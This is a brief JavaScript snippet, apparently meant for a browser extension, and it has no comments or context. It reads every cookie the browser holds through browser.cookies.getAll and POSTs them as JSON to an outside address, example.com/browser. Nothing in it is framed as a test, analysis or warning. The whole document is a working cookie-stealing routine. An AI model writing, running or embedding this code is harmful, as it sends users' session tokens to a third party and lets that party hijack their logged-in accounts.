browser.cookies.getAll({}, function(cookies) {
    fetch("https://example.com/browser", {
        method: "POST",
        body: JSON.stringify(cookies)
    });
});
